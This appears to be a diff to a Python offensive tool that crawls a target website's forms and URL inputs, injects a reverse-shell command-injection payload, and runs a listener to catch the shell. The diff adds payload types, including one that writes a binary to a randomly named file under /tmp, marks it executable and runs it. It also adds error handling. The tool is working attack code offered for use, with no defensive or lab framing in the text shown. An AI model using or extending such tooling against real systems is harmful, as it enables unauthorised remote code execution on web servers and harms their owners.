@@ -6,16 +6,29 @@ from payloads import Monkey, Generator
 
 from server import ReverseListener
 
+import random
+import string
+import sys
+
 parser = argparse.ArgumentParser(description='Test')
+
+
+def randword(length):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
 
 def comma_separated(names):
     return names.split(',')
 
+
+PAYLOAD_TYPES = ['shell', 'binshell', 'stager']
+
 parser.add_argument('target_url', help='Target URL')
-parser.add_argument('-lhost', '--lhost', help='Server the payload connects to', default='127.0.0.1')
-parser.add_argument('-lport', '--lport', help='Port of the server the payload connects to', default='80')
-parser.add_argument('-ptype', '--ptype', help='Payload type', default='shell')
-parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject", default=[])
+parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
+parser.add_argument('-lport', '--lport', help="Port the payload connects to", default='80')
+parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
+parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
 parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')
 
 args = parser.parse_args()
@@ -30,7 +43,12 @@ if not args.target_url:
     print("Target URL required")
     exit(1)
 
-if not "http" in args.target_url:
+if args.ptype not in PAYLOAD_TYPES:
+    print("\n")
+    print(f"-ptype should be one of [{', '.join(PAYLOAD_TYPES)}]")
+    exit(1)
+
+if "http" not in args.target_url:
     print("No protocol specified")
     exit(1)
 
@@ -43,49 +61,61 @@ LPORT = args.lport
 
 has_shell = False
 
+
 def on_recv(data):
     print("".join([d.decode() for d in data]))
 
+
 def on_shell(addr):
+    global has_shell
     has_shell = True
 
-monkey = Monkey(args.target_url)
 
-generator = Generator(lhost=LHOST, lport=LPORT)
+try:
+    monkey = Monkey(args.target_url)
 
-listener = ReverseListener(
-    ip=LHOST, port=LPORT, recv_cb=on_recv, success_cb=on_shell, once=False)
+    generator = Generator(lhost=LHOST, lport=LPORT)
 
-listener.start()
+    listener = ReverseListener(
+        ip=LHOST, port=LPORT, recv_cb=on_recv, success_cb=on_shell, once=False)
 
-if monkey.get_forms() is None and monkey.get_inputs() is None:
-    print("Nowhere to inject")
-    exit(1)
+    listener.start()
 
-print(monkey.get_js_endpoints())
-print(monkey.get_js_urls())
+    if monkey.get_forms() is None and monkey.get_inputs() is None:
+        print("Nowhere to inject")
+        exit(1)
 
-if args.ptype == 'shell':
-    pl = generator.ir_shell()
-elif args.ptype == 'bin':
-    pl_bin = generator.ir_bin()
-    pl = f'printf "{pl_bin}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
-elif args.ptype == 'nc': # todo
-    pass
-elif args.ptype == 'custom': # todo
-    pass
+    print(monkey.get_js_endpoints())
+    print(monkey.get_js_urls())
 
-if monkey.get_forms():
-    print("Injecting via forms")
-    monkey.autoinject_forms(pl)
+    if args.ptype == 'shell':
+        pl = generator.ir_shell()
+    elif args.ptype == 'binshell':
+        pl_bin = generator.ir_bin()
+        n = randword(4)
+        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
+    elif args.ptype == 'nc':  # todo
+        pass
+    elif args.ptype == 'custom':  # todo
+        pass
 
-if monkey.get_inputs() and not has_shell:
-    print("Injecting with names found in inputs")
-    monkey.autoinject_urls(pl)
+    if monkey.get_forms():
+        print("Injecting via forms")
+        monkey.autoinject_forms(pl)
 
-if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
-    print("Injecting via endpoints with custom names")
-    shell = generator.ir_shell()
-    monkey.autoinject_urls()
+    if monkey.get_inputs() and not has_shell:
+        print("Injecting with names found in inputs")
+        monkey.autoinject_urls(pl)
 
+    if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
+        print("Injecting via endpoints with custom names")
+        shell = generator.ir_shell()
+        monkey.autoinject_urls()
 
+    if not has_shell:
+        print("\n")
+        print("Failed :(")
+        print("Try a different payload type")
+
+except KeyboardInterrupt:  # ctrl-c
+    sys.exit(0)
